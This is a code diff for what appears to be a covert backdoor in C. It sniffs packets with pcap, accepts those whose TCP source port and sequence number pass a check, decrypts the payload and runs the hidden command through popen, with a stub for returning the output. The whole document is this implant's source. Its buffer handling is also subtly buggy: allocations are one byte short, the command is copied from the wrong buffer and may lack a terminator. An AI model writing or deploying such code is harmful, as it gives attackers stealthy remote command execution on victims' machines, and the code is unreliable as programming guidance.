@@ -1,3 +1,5 @@
+#include <stdio.h>
+#include <stdlib.h>
 #include <unistd.h>
 
 #include "crypto.h"
@@ -24,6 +26,42 @@ int get_source_port(const u_char* packet)
     return tcp_sport;
 }
 
+/*
+ * Executes a command using popen and puts the results into result.
+ *
+ * NOTE: output must be freed
+ *
+ * Params:
+ *      const char *command: The command to execute.
+ *      char **result: The pointer the the output buffer pointer.
+ */
+void execute_command(const char *command, char **result)
+{
+    FILE *fp;
+    const int MAX_LINE_LEN = 1024;
+    char line_buffer[MAX_LINE_LEN];
+
+    fp = popen(command, "r");
+
+    // get the first line to determine the first malloc size
+    if (!fgets(line_buffer, MAX_LINE_LEN, fp)) return;
+    *result = (char*)malloc(sizeof(char) * strlen(line_buffer));
+    strcpy(*result, line_buffer);
+
+    // grab all the lines and realloc and concat string as needed
+    while (fgets(line_buffer, MAX_LINE_LEN, fp))
+    {
+        *result = (char*)realloc(*result, strlen(*result) + strlen(line_buffer));
+        if (!*result)
+        {
+            return;
+        }
+        strcat(*result, line_buffer);
+    }
+
+    pclose(fp);
+}
+
 
 /*
 * Callback function for examining captured packets.
@@ -39,6 +77,7 @@ int get_source_port(const u_char* packet)
 */
 void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
 {
+    char *command_output;
 
     const char* COMMAND_START = "start[";
     const char* COMMAND_END = "]end";
@@ -50,8 +89,6 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     char payload_buffer[MAX_COMMAND_LEN];
     char decrypted[MAX_COMMAND_LEN];
 
-    int len;
-    int loop;
     int tcp_sport;
     u_int tcp_seqnum;
 
@@ -83,13 +120,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     payload = (char*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
 
     // Step 2: Authenticate the packet
-    if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
-    {
-        // printf("packet not authenticated\n");
-        // printf("source port: %d\n", tcp_sport);
-        // printf("sequence_number: %d\n", tcp_seqnum);
-        return;
-    }
+    if (!is_seq_num_auth(tcp_sport, tcp_seqnum)) return;
     printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
 
     // Step 3: Decrypt the payload
@@ -103,13 +134,14 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     if (!(end_ptr = strstr(decrypted, COMMAND_END))) return;
 
     // Step 5: Extract the command
-    memset(command, 0, sizeof(command));
     strncpy(command, payload, end_ptr - payload);
 
     // Step 6: Execute the command
-    system(command);
+    execute_command(command, &command_output);
 
-    // Step 7: Send the command's output to the sender of the command
+    // Step 7: Send the results back
+    printf("%s", command_output); // replace this with sending the command results back
+    free(command_output); // free command_output which was malloced by execute_command
 
     return;
 }
